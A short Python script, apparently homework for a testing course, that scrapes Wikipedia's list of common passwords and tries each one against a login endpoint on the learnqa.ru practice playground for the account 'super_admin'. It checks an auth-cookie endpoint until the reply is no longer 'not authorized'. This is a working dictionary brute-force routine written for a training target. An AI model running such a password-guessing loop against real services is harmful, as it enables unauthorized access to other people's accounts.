import requests, html,lxml

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

def print_status(response):
    print(response.status_code)
    print(response.cookies)
    print(response.text)
login = "super_admin"
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)

for password in passwords:
    password = str(password).strip()
    print(password)

for password in passwords:
    response = requests.post(url, data = {"login": login, "password": password})
    cookie_value = response.cookies.get("auth_cookie")
    print(cookie_value)
    cookies = {"auth_cookie": cookie_value}
    response2 = requests.post(url2,data = {"auth_cookie":cookies})
    print(response2.text)
    if response2.text != "You are NOT authorized":
        print(password)
        print(response2.text)

